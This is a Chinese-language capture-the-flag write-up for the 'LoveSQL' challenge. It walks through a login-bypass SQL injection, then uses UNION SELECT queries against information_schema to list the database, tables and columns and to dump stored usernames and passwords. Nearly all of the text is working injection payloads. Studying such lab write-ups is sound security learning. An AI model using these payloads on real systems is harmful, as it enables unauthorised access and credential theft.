---
date: 2001-01-01
tags:
  - Others
categories:
  - Others
title: "[极客大挑战 2019]LoveSQL"
---
## [极客大挑战 2019]LoveSQL
【SQL注入】
打开题目先任意输入内容查看网页请求方式，再进行测试。

![image-20220903093117758](img/image-20220903093117758.png)

这里很明显的有报错信息，猜测内部 SQL 语句，并进行注入：

```
select ... from ... where username = '$username' and password = '$password';

// 当 # 作为注释时失败，于是将 # 进行 url 编码得出结果。
check.php?username=1' or 1=1%23&password=1
```

![image-20220903093743198](img/image-20220903093743198.png)

回显登录成功，密码应该是一串 MD5 加密，但是解码失败，回过头来再进行注入。
测字段、看回显、查库、查表、查字段。
`check.php?username=1'order by 4%23&password=1`

![image-20220903094632190](img/image-20220903094632190.png)

说明有 3 个字段，再用 union 注入查看回显`check.php?username=1'union select 1,2,3%23&password=1`

![image-20220903095111304](img/image-20220903095111304.png)

查数据库：

```
check.php?username=1'union select 1,2,group_concat(schema_name) from information_schema.schemata%23&password=1
或
check.php?username=1'union select 1,2,database()%23&password=1
```

![image-20220903095834969](img/image-20220903095834969.png)

查表：

```
check.php?username=1'union select 1,2,group_concat(table_name) from information_schema.tables where table_schema='geek'%23&password=1
```

![image-20220903105925161](img/image-20220903105925161.png)

查字段及其内容：

```
check.php?username=1'union select 1,2,group_concat(column_name) from information_schema.columns where table_name='l0ve1ysq1'%23&password=1
check.php?username=1'union select 1,2,group_concat(username,password) from geek.l0ve1ysq1%23&password=1
```

![image-20220903111135796](img/image-20220903111135796.png)

（一般情况下的登录框先尝试弱口令，但此题明确提示 SQL 注入，在注入的时候并没有尝试弱口令，根据题目得出的用户名确实存在 admin 用户！）



